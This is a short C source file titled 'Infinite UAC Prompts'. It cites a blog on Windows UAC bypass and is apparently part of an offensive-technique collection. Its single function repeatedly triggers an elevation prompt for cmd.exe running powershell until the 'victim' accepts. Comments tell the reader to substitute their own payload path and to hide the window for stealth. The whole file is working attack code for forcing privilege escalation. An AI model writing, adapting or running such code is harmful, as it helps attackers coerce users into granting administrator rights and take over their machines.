/*
Title: Infinite UAC Prompts
Resources:
	- https://any.run/cybersecurity-blog/windows11-uac-bypass/
*/
#include <Windows.h>
#include <stdio.h>

BOOL InfiniteUACPrompts() {
	while (TRUE) {
		SHELLEXECUTEINFOW sei = { sizeof(sei) };
		sei.lpVerb = L"runas";
		sei.lpFile = L"cmd.exe";
		sei.lpParameters = L"/c powershell.exe && pause"; // Replace the 'powershell'.exe with your desired path.
		sei.hwnd = nullptr;
		sei.nShow = SW_SHOW; // SW_HIDE is also good choice for more stealthier in practice.

		if (ShellExecuteExW(&sei))
			return TRUE;

		// This loop continues until the victim accepts the UAC prompt...
	}
	
	return TRUE;
}
